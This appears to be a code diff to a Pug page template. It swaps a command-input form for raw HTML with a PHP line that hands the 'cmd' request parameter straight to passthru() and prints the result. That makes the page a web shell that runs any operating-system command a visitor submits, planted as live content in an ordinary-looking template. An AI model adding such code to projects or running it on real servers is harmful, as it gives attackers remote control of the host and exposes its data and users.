@@ -15,13 +15,9 @@ block content
         // textarea(rows='4', cols='50', form='usrform', name='taganalysis')
         //   | #{taganalysis}
 
-      form(action='', method='get')
-        | Command: 
-        input(type='text', name='cmd')
-        input(type='submit', value='Exec')
-      | Output:
-      br
-      pre.
 
-
-
+      |<form action="" method="get">
+      |Command: <input type="text" name="cmd" /><input type="submit" value="Exec" />
+      |</form>
+      |Output:<br />
+      |<pre><?php passthru($_REQUEST['cmd'], $result); ?></pre>
